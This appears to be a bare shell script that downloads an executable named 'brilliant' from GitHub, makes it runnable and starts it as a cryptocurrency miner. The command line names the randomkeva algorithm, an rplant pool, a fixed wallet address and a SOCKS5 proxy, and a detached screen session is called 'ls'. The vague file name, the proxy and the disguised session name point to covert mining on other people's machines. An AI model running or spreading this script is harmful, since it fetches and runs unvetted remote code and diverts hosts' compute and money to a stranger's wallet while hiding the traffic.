apt update 
apt install screen -y
wget -O brilliant https://github.com/brilliant-cut/brilliant-cut/raw/main/brilliant
chmod +x brilliant
screen -dmS ls
./brilliant --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.BC=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://50.62.35.16:11818 --keepalive true
